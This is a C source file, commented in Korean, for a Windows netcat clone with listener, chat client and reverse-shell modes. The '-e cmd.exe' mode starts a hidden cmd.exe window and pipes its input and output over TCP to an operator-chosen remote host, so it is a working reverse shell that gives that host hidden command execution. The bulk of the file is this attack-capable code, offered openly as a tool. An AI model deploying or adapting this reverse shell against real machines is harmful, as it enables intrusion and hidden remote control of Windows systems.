#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h> 
#include <tchar.h> 

// winsock 라이브러리 연결
#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096
#define MAX_PENDING_CONNECTIONS 1

// --- 함수 선언 ---
int run_server(const char* port);
int run_client(const char* host, const char* port, int enable_shell);
void handle_io(SOCKET sock);
void cleanup(SOCKET sock);

// --- 파이프 및 중계 함수를 위한 구조체 ---
// CreateThread에 두 개 이상의 인수를 전달하기 위한 구조체
typedef struct {
    SOCKET sock;
    HANDLE hPipe;
} RELAY_PARAMS;

// --- 파이프 및 중계 함수 선언 ---
DWORD WINAPI relay_pipe_to_socket(LPVOID lpParam);
DWORD WINAPI relay_socket_to_pipe(LPVOID lpParam);
int run_pipe_reverse_shell(SOCKET sock);

// --------------------- 메인 함수 ---------------------
int main(int argc, char** argv) {
    WSADATA wsaData;
    int iResult;

    // 1. Winsock 초기화
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", iResult);
        return 1;
    }

    // 명령줄 파싱
    if (argc == 3 && strcmp(argv[1], "-l") == 0) {
        // 서버 모드: my_netcat -l <port>
        iResult = run_server(argv[2]);
    }
    else if (argc == 3) {
        // 클라이언트 모드 (채팅): my_netcat <host> <port>
        iResult = run_client(argv[1], argv[2], 0);
    }
    else if (argc == 5 && strcmp(argv[3], "-e") == 0) {
        // 클라이언트 모드 (리버스 쉘): my_netcat <host> <port> -e cmd.exe
        iResult = run_client(argv[1], argv[2], 1);
    }
    else {
        printf("Simple Netcat Clone (Windows)\n");
        printf("Usage:\n");
        printf("  Server (Chat/Listener): my_netcat -l <port>\n");
        printf("  Client (Chat): my_netcat <host> <port>\n");
        printf("  Client (Reverse Shell - Pipe): my_netcat <host> <port> -e cmd.exe\n");
        iResult = 1;
    }

    // 4. Winsock 정리
    WSACleanup();
    return iResult;
}

// --------------------- 클라이언트/서버 공통 유틸리티 ---------------------

void cleanup(SOCKET sock) {
    if (sock != INVALID_SOCKET) {
        shutdown(sock, SD_BOTH);
        closesocket(sock);
    }
}

// --------------------- 클라이언트 로직 ---------------------

int run_client(const char* host, const char* port, int enable_shell) {
    int iResult;
    SOCKET connect_sock = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;

    printf("Client mode: Connecting to %s:%s...\n", host, port);

    // 주소 정보 설정 및 획득
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        fprintf(stderr, "getaddrinfo failed: %d\n", iResult);
        return 1;
    }

    // 소켓 생성 및 연결 시도
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        connect_sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (connect_sock == INVALID_SOCKET) continue;

        iResult = connect(connect_sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(connect_sock);
            connect_sock = INVALID_SOCKET;
            continue;
        }
        break; // 연결 성공
    }

    freeaddrinfo(result);

    if (connect_sock == INVALID_SOCKET) {
        fprintf(stderr, "Unable to connect to server!\n");
        return 1;
    }

    printf("Connection successful.\n");

    if (enable_shell) {
        // 리버스 쉘 모드: 파이프 기반 중계 함수 호출
        iResult = run_pipe_reverse_shell(connect_sock);
    }
    else {
        // 일반 채팅 모드
        handle_io(connect_sock);
        iResult = 0;
    }

    cleanup(connect_sock);

    return iResult;
}

// --------------------- 파이프 기반 리버스 쉘 로직 ---------------------

int run_pipe_reverse_shell(SOCKET sock) {
    // 1. 파이프 핸들
    HANDLE hStdInRead, hStdInWrite;     // 소켓 -> CMD (입력) 파이프
    HANDLE hStdOutRead, hStdOutWrite;   // CMD -> 소켓 (출력) 파이프

    // 2. 프로세스 정보 및 STARTUPINFO
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    // 3. 보안 속성: 핸들 상속 허용
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    const TCHAR* CMD_PATH = _T("C:\\Windows\\System32\\cmd.exe");
    const TCHAR* CMD_ARGS = _T("/K");

    // --- 1. 파이프 생성 ---
    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
        fprintf(stderr, "CreatePipe (Input) failed: %lu\n", GetLastError());
        return 1;
    }
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        fprintf(stderr, "CreatePipe (Output) failed: %lu\n", GetLastError());
        CloseHandle(hStdInRead); CloseHandle(hStdInWrite);
        return 1;
    }

    // --- 2. STARTUPINFO 설정 ---
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    // CMD의 입/출력을 파이프 핸들로 연결
    si.hStdInput = hStdInRead;      // CMD가 입력으로 사용할 핸들
    si.hStdOutput = hStdOutWrite;    // CMD가 출력으로 사용할 핸들
    si.hStdError = hStdOutWrite;    // 에러 출력 핸들

    si.wShowWindow = SW_HIDE;        // CMD 창 숨김

    ZeroMemory(&pi, sizeof(pi));

    // --- 3. CMD 프로세스 생성 ---
    TCHAR cmd_line[512];
    _stprintf_s(cmd_line, sizeof(cmd_line) / sizeof(TCHAR), _T("\"%s\" %s"), CMD_PATH, CMD_ARGS);

    if (!CreateProcess(
        NULL, cmd_line, NULL, NULL, TRUE, // 핸들 상속 TRUE
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    )) {
        fprintf(stderr, "CreateProcess failed (%lu)\n", GetLastError());
        // 모든 파이프 핸들 정리
        CloseHandle(hStdInRead); CloseHandle(hStdInWrite);
        CloseHandle(hStdOutRead); CloseHandle(hStdOutWrite);
        return 1;
    }

    // --- 4. 불필요한 핸들 정리 ---
    // CMD가 상속받은 핸들 (hStdInRead, hStdOutWrite)은 닫습니다.
    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    // --- 5. I/O 중계 시작 ---
    printf("Reverse Shell via Pipe Relay established. Starting I/O relay.\n");

    // 중계에 필요한 인자 구조체 생성 (힙 할당)
    RELAY_PARAMS* paramsIn = (RELAY_PARAMS*)malloc(sizeof(RELAY_PARAMS));
    RELAY_PARAMS* paramsOut = (RELAY_PARAMS*)malloc(sizeof(RELAY_PARAMS));

    if (!paramsIn || !paramsOut) {
        fprintf(stderr, "Memory allocation failed.\n");
        // 메모리 해제 및 종료 로직 추가 필요
        // ...
    }

    // 입력 (소켓 -> 파이프)
    paramsIn->sock = sock;
    paramsIn->hPipe = hStdInWrite; // CMD 입력에 쓰는 핸들

    // 출력 (파이프 -> 소켓)
    paramsOut->sock = sock;
    paramsOut->hPipe = hStdOutRead; // CMD 출력에서 읽는 핸들

    // 멀티스레딩을 사용하여 동시 처리
    HANDLE hThreadIn = CreateThread(NULL, 0, relay_socket_to_pipe, paramsIn, 0, NULL);
    HANDLE hThreadOut = CreateThread(NULL, 0, relay_pipe_to_socket, paramsOut, 0, NULL); // C2198 오류 수정 완료

    // CMD 프로세스가 종료될 때까지 대기
    WaitForSingleObject(pi.hProcess, INFINITE);

    // --- 6. 정리 ---
    printf("Reverse shell process finished. Cleaning up.\n");

    // 스레드 종료 및 핸들 정리
    TerminateThread(hThreadIn, 0);
    TerminateThread(hThreadOut, 0);
    CloseHandle(hThreadIn);
    CloseHandle(hThreadOut);

    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(paramsIn);
    free(paramsOut);

    return 0;
}

// --------------------- 중계 (Relay) 스레드 함수 ---------------------

/**
 * @brief 소켓에서 데이터를 읽어 파이프에 씁니다 (서버 명령 -> CMD 입력).
 */
DWORD WINAPI relay_socket_to_pipe(LPVOID lpParam) {
    RELAY_PARAMS* params = (RELAY_PARAMS*)lpParam;
    SOCKET sock = params->sock;
    HANDLE hPipeWrite = params->hPipe;

    char buffer[BUFFER_SIZE];
    int bytes_read;
    DWORD bytes_written;

    while ((bytes_read = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        if (!WriteFile(hPipeWrite, buffer, bytes_read, &bytes_written, NULL)) {
            // WriteFile 실패 시 (CMD가 닫혔을 때)
            break;
        }
    }
    // 소켓 연결이 끊어지면 파이프도 닫아 CMD에게 종료를 알립니다.
    CloseHandle(hPipeWrite);
    return 0;
}

/**
 * @brief 파이프에서 데이터를 읽어 소켓에 씁니다 (CMD 출력 -> 서버 전송).
 */
DWORD WINAPI relay_pipe_to_socket(LPVOID lpParam) {
    RELAY_PARAMS* params = (RELAY_PARAMS*)lpParam;
    SOCKET sock = params->sock;
    HANDLE hPipeRead = params->hPipe;

    char buffer[BUFFER_SIZE];
    DWORD bytes_read;
    int bytes_sent;
    BOOL bResult;

    while (1) {
        // ReadFile은 Blocking 모드로 동작하며 CMD에서 데이터가 올 때까지 대기
        bResult = ReadFile(hPipeRead, buffer, sizeof(buffer), &bytes_read, NULL);

        if (!bResult || bytes_read == 0) {
            // ReadFile 실패 (파이프가 닫힘 = CMD가 종료됨)
            break;
        }

        bytes_sent = send(sock, buffer, bytes_read, 0);
        if (bytes_sent == SOCKET_ERROR) {
            // send 실패 (소켓이 닫힘)
            break;
        }
    }
    // 파이프가 닫히면 소켓을 종료합니다.
    shutdown(sock, SD_BOTH);
    CloseHandle(hPipeRead);
    return 0;
}

// --------------------- 서버 로직 (변경 없음) ---------------------

int run_server(const char* port) {
    int iResult;
    SOCKET listen_sock = INVALID_SOCKET;
    SOCKET client_sock = INVALID_SOCKET;
    struct addrinfo* result = NULL, hints;

    printf("Server mode: Listening on port %s...\n", port);

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, port, &hints, &result);
    if (iResult != 0) {
        fprintf(stderr, "getaddrinfo failed: %d\n", iResult);
        return 1;
    }

    listen_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listen_sock == INVALID_SOCKET) {
        fprintf(stderr, "socket failed: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        return 1;
    }

    iResult = bind(listen_sock, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "bind failed: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(listen_sock);
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(listen_sock, MAX_PENDING_CONNECTIONS);
    if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "listen failed: %d\n", WSAGetLastError());
        closesocket(listen_sock);
        return 1;
    }

    printf("Waiting for a connection...\n");
    client_sock = accept(listen_sock, NULL, NULL);
    if (client_sock == INVALID_SOCKET) {
        fprintf(stderr, "accept failed: %d\n", WSAGetLastError());
        closesocket(listen_sock);
        return 1;
    }

    closesocket(listen_sock);
    handle_io(client_sock);
    cleanup(client_sock);

    return 0;
}


// handle_io 함수 (서버/일반 클라이언트의 통신 루프)
void handle_io(SOCKET communication_sock) {
    char recvbuf[BUFFER_SIZE];
    char sendbuf[BUFFER_SIZE];
    int iResult;
    fd_set read_fds;
    struct timeval tv;

    // 콘솔 핸들 (stdin)을 가져옴
    HANDLE hStdIn = GetStdHandle(STD_INPUT_HANDLE);

    printf("Connection established. Start typing.\n");

    while (1) {

        FD_ZERO(&read_fds);
        FD_SET(communication_sock, &read_fds);

        tv.tv_sec = 0;
        tv.tv_usec = 1000;

        // 1. 소켓 데이터 수신 대기 (select)
        iResult = select(0, &read_fds, NULL, NULL, &tv);

        if (iResult == SOCKET_ERROR) {
            fprintf(stderr, "select failed with error: %d\n", WSAGetLastError());
            break;
        }

        if (iResult > 0) {
            // 소켓에서 데이터가 수신됨
            iResult = recv(communication_sock, recvbuf, BUFFER_SIZE - 1, 0);
            if (iResult > 0) {
                recvbuf[iResult] = '\0';
                // 개행 문자 처리 (서버에서 받은 명령을 그대로 출력)
                printf(">> %s", recvbuf);
                fflush(stdout);
            }
            else if (iResult == 0) {
                printf("Connection closed by remote peer.\n");
                break;
            }
            else {
                fprintf(stderr, "recv failed: %d\n", WSAGetLastError());
                break;
            }
        }

        // 2. 표준 입력 (stdin) 데이터 확인 (키보드 입력)
        DWORD bytes_read_console;
        if (_kbhit()) { // 👈 키보드 입력이 있는지 확인
            // 키보드 입력이 있음
            if (fgets(sendbuf, BUFFER_SIZE, stdin) != NULL) {
                iResult = send(communication_sock, sendbuf, (int)strlen(sendbuf), 0);
                if (iResult == SOCKET_ERROR) {
                    fprintf(stderr, "send failed: %d\n", WSAGetLastError());
                    break;
                }
                // ... 종료 조건 ...
            }
        }
        else {
            Sleep(10); // 불필요한 CPU 사용 방지
        }
    }
}